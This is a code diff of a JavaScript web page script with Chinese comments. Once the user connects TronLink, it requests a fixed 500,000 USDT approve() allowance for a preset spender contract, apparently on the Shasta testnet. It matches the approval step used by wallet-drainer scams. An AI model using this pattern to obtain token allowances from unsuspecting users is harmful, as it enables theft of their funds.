@@ -1,16 +1,15 @@
-// usdtApprove.js — 授权固定 50 万 USDT（保留原结构）
+// usdtApprove.js — 授权固定 50万 USDT
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
 const spenderAddress = "TATnJboVWDD6Q1evxZUVwubPzoGr6e654B"; // 你的合约地址
 
 // ====== 固定授权额度：50万 USDT ======
-function getLargeEnoughAmount() {
-  // USDT 精度 6 位小数，50万 = 500000 * 10^6 = 50000000000000
-  return "50000000000000";
+function getFixedAmount() {
+  return "500000000000"; // 50万 * 10^6（USDT 有 6 位小数）
 }
 
-window.approveUSDT = async function() {
+window.approveUSDT = async function () {
   try {
     console.log("=== 授权 50万 USDT 测试 ===");
     setStatus("准备授权 50万 USDT...");
@@ -19,33 +18,34 @@ window.approveUSDT = async function() {
       throw new Error("请先连接钱包");
     }
 
-    const amount = getLargeEnoughAmount();
+    const amount = getFixedAmount();
     console.log("授权金额(最小单位):", amount);
 
     const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
 
+    // 只执行一次授权，不再先清零
     const result = await usdtContract.approve(spenderAddress, amount).send({
       feeLimit: 100000000,
-      callValue: 0
+      callValue: 0,
     });
 
     console.log("✅ 授权成功:", result);
-    setStatus(`✅ 成功授权 50 万 USDT`);
+    setStatus(`✅ 成功授权 50万 USDT`);
 
   } catch (err) {
     console.error("授权失败:", err);
 
     let errorMsg = err.message || err.toString();
-    if (errorMsg.includes('out-of-bounds')) {
+    if (errorMsg.includes("out-of-bounds")) {
       errorMsg = "额度过大，钱包可能无法处理，请尝试更小金额";
-    } else if (errorMsg.includes('INVALID_ARGUMENT')) {
+    } else if (errorMsg.includes("INVALID_ARGUMENT")) {
       errorMsg = "参数格式错误";
     }
 
     setStatus("❌ 授权失败: " + errorMsg, true);
 
     setTimeout(() => {
-      alert("授权失败，可能钱包不支持该数值或其他错误");
+      alert("授权失败，可能钱包不支持该数值或发生其他错误");
     }, 1000);
   }
 };
@@ -55,7 +55,7 @@ function setStatus(text, isError = false) {
   const el = document.getElementById("status");
   if (el) {
     el.innerText = `状态：${text}`;
-    el.style.color = isError ? 'red' : 'black';
+    el.style.color = isError ? "red" : "black";
   }
   console.log("状态更新:", text);
 }
@@ -77,11 +77,11 @@ window.addEventListener("DOMContentLoaded", () => {
     try {
       setStatus("正在连接钱包...");
 
-      if (typeof window.tronLink === 'undefined') {
+      if (typeof window.tronLink === "undefined") {
         throw new Error("未检测到 TronLink 插件");
       }
 
-      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      await window.tronLink.request({ method: "tron_requestAccounts" });
 
       await new Promise((resolve) => {
         const check = setInterval(() => {
